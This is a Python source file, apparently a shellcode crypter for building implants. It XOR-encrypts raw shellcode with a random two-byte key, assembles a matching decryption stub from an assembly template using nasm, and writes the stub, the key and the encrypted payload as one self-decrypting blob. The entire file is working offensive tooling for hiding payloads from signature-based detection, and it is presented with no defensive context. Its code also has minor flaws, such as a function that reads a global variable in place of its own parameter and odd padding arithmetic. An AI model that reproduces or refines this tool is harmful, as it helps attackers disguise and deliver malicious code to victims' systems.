import argparse
from msilib.schema import File
from random import randbytes
import os
import time
 
 
def GenerateKey(NbBytes):
   return randbytes(int(NbBytes))

def AppendByteArray(OrigBA,AppendBA):
    for i in range(len(AppendBA)):
        OrigBA.append(AppendBA[i])
    

def PrintShellcode(shellcode):
    for i in range(len(shellcode)):
        print(hex(shellcode[i]),end=' ')
    print("")

#return encrypted shellcode as byte array
def EncryptShellcode(key,shellCode):
    shellcodeLength=len(shellCode)
    keyLength=len(key)
    nbChunk=shellcodeLength // int(keyLength)
    remainderBytesNb=shellcodeLength % int(keyLength)
    enc_shellcode=bytearray()
    
    for i in range(nbChunk):
        basePos=keyLength*i
        for j in range(keyLength):
            enc_shellcode.append(shellCode[basePos+j]^ key[j])
            
    for j in range(remainderBytesNb):
        basePos=nbChunk*keyLength
        enc_shellcode.append(shellCode[basePos+j]^ key[j])
    return enc_shellcode    

#return DecryptionStub as byte array
def GetDecryptionStub(shellCodeLength, keyLength):

#If shellcode_length is not a multiple of keylength it makes the asm loop more complex to finish exactly at the last shellcode byte
#Instead we will tell asm that the shellcode_length is larger, to  be a multiple of keylength.
    remainderBytesNb=shellcodeLength % int(keyLength)

    with open('Asm.template','r') as asmTemplateFile:
        asmTemplateStr=asmTemplateFile.read()
        asmTemplateStr=asmTemplateStr.replace("SHELLCODE_LENGTH",str(shellCodeLength+remainderBytesNb))

    with open('decStub.asm','w') as decStubFile:
        decStubFile.write(asmTemplateStr)
    
    os.system('nasm decStub.asm -o decStub.bin')
    time.sleep(2)

    with open('decStub.bin','rb') as decStubFile:
        decStub=decStubFile.read() 
    return decStub



## For now only k=2 is possible
#python .\Encryptor.py -f .\test2.shellcode -o shellcodeAndKey
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Shellcode to C/ASM implant stub converter.')
    parser.add_argument('-v', '--verbose', action='store_true', help='display shellcode and encrypted shellcode')
    parser.add_argument('-f', '--file', action='store', help='The filename containing the shellcode.')
    parser.add_argument('-o', '--output_filename', action='store', help='The output file name')
    #parser.add_argument('-k', '--keylength', action='store', help='Number of bytes of the key')
    parser.add_argument('-d', '--dec_stub', action='store', help='file containing the decryption stub. In case we do not want to use template')

    args = vars(parser.parse_args())

    #get shellcode
    with open(args['file'],'rb') as shellcodeFile:
        shellcode=shellcodeFile.read()

    # For now keylength is two bytes. If variable, need to change the stubs
    #keyLength=args["keylength"]
    keyLength="2"
    shellcodeLength=len(shellcode)
    nbChunk=shellcodeLength // int(keyLength)
    remainderBytesNb=shellcodeLength % int(keyLength)
    key=GenerateKey(keyLength)
    print("shellcode length: ",len(shellcode))
    print("Key Length:",keyLength)
    print("Random Key:",key.hex())
    print("number of chunks:",nbChunk)
    print("Nb of remainder bytes:",remainderBytesNb)

    encShellcode=EncryptShellcode(key,shellcode)
    decShellcode=EncryptShellcode(key,encShellcode)

    if args['verbose']:
        print("Original shellcode:")
        PrintShellcode(shellcode)
        print("Encrypted shellcode")
        PrintShellcode(encShellcode)
        print("Decrypted shellcode:")
        PrintShellcode(decShellcode)
        print("prepend key:")

    #get decryption stub
    if(not args['dec_stub']):
        decStub=GetDecryptionStub(shellcodeLength,keyLength)
    else:
        with open(args['dec_stub'],'rb') as decStubFile:
            decStub=decStubFile.read() 

    encShellcodePrepend=bytearray()
    AppendByteArray(encShellcodePrepend, decStub)
    AppendByteArray(encShellcodePrepend ,key)
    AppendByteArray(encShellcodePrepend,encShellcode)

    if args['verbose']:
        PrintShellcode(encShellcodePrepend)

    with open(args['output_filename'],'wb') as outPutFile:
        outPutFile.write(encShellcodePrepend)

    with open("decshellcode.bin",'wb') as outPutFile:
        outPutFile.write(decShellcode)


